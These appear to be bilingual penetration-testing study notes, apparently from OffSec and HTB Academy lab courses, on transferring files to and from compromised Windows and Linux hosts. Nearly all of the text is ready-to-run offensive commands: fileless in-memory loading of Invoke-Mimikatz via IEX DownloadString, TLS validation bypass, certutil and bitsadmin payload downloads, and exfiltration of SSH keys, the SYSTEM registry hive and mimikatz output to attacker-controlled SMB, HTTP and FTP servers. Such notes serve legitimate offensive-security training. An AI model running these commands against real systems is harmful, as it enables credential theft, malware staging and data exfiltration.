>[!check]
>windows: `certutil -hashfile <file> md5`
>linux: `md5sum <file>`

[URL Encode/Decode](https://meyerweb.com/eric/tools/dencoder/)
$1) SMB:$
On Kali:
```bash
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
impacket-smbserver test . -smb2support  -username kourosh -password kourosh -ip <LHOST>
```
On Windows:
```powershell
net use m: \\Kali_IP\test /user:kourosh kourosh #将kali的test挂载到m:\，像正常文件系统一样使用
copy mimikatz.log m:\ #使用m:\将windows运行mimikatz的报告发回kali

Copy-Item -Path "C:\source\file.txt" -Destination "C:\destination\file.txt"
net use \\servername\sharename /delete
net use X: /delete
net use * /delete /y
```
$2) RDP mounting shared folder:$
- Using xfreerdp:
On Kali:
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-
200

# in widows:\\tsclient\<share_name> in linux : ~/thinclient_drives
```
On windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
- Using rdesktop:
On Kali: 
```bash
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```
On Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
$3) Impacket tools:$
psexec and wmiexec are shipped with built in feature for file transfer.
**Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.
Uploading mimikatz.exe to the target machine:
```bash
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
Downloading mimikatz.log:
```bash
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
$4) Evil-winrm:$
- Uploading files:
```bash
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```
- Downloading files:
```bash
download mimikatz.log /home/kali/Documents/pen-200
```
$5) C2 frameworks:$
Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

6) In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.

Additional Resources:
File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc
PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers
https://blog.ropnop.com/transferring-files-from-kali-to-windows/

Happy hacking!

# Exfiltration From Victim
https://book.hacktricks.xyz/v/cn/generic-methodologies-and-resources/exfiltration
******************
# Copy/Peste With Base64Encode
通过复制粘贴编码成base64的字符串进行文件传输(不使用网络)
```powershell
# cat id_rsa |base64 -w 0;echo 将需要传输的文件编码为base64
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS....")) 
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 # 传输完整性验证
```
#warning Windows 命令行实用程序（cmd.exe）的**最大字符串长度为 8,191 个字符**。此外，如果
您尝试发送非常大的字符串，Web shell 可能会出错。
Upload
```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash #完整性

#echo IyBDb3..... | base64 -d > hosts
#md5sum hosts
```

#  Powershell .Net Class
 
## File Download --> DownloadFile / DownloadFileAsync
使用New.WebClient下的Method
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```
### Invoke-WebRequest
Alias: `iwr\curl\wget` wget是iwr的封装版本，命令会更简洁点。
[详细的下载框架- 根据情况使用](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
***
如果使用IE进行下载，可能会出现IE还没通过首次配置(现在几乎是必然),通过添加`-UseBasicParsing `绕过
SSL/TSL的证书问题：`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
```powershell
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```
### Fileless Method --> DownloadString
直接通过流或者内存进行加载payload，**直接加载到内存**
**Invoke-Expression 命令或别名 IEX**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

#管理到IEX，跟上面的command是一样的
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
***

## File Upload With Powershell
 上传函数使用 Invoke-WebRequest 或 Invoke-RestMethod 进行构建
 python 可以下载http.server的模块 ---> uploadserver
 On Kali: 
```bash
 pip install uploadserver
 python3 -m uploadserver
```
On Windows ------> [PSUploads.ps1](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1)
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
### Upload with Base64
将目标文件转换为base64后就可以直接通过iwr进行POST传输。再使用nc接受base64编码。
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```bash
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```
## SMB upload Over wsgiDAV
Set up on Kali:
```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
On Windows:
```powershell
dir \\<Kali_IP>\DavWWWRoot #DavWWWRoot是Windows Shell 识别的特殊关键字
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\ #有目标文件夹，就不用DavWWWRoot
```
# FTP Server On Kali
Kali set up:
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 #默认端口是2121 --write 开启上传功能
```
on windows:
```powershell
# Same as DownloadFile method in http transfer.
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Upload.Use UploadFile method.
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
在一个非交互式的shell。需要创建一个FTP命令文件来下载文件。
```text
ftp -v -n -s:ftpcommand.txt

echo open 10.10.199.147 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt   #echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt --> upload
echo bye >> ftpcommand.txt

open 10.10.199.147
 USER web_svc Diamond1
 binary
 PUT C:\windows.old\Windows\System32\SYSTEM .\temp\SYSTEM
 bye
```

# Cheat Sheet --- HTB Academy
| Command                                                                                                          |                                 Description |
| :--------------------------------------------------------------------------------------------------------------- | ------------------------------------------: |
| Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1                                            |             Download a file with PowerShell |
| IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')                              |   Execute a file in memory using PowerShell |
| Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64                                            |               Upload a file with PowerShell |
| bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe                                                   |             Download a file using Bitsadmin |
| certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe                                                      |              Download a file using Certutil |
| wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh                   |                  Download a file using Wget |
| curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh                   |                  Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`        |                   Download a file using PHP |
| scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip                                               |                     Upload a file using SCP |
| scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe                                                           |                   Download a file using SCP |
| Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe" | Invoke-WebRequest using a Chrome User Agent |

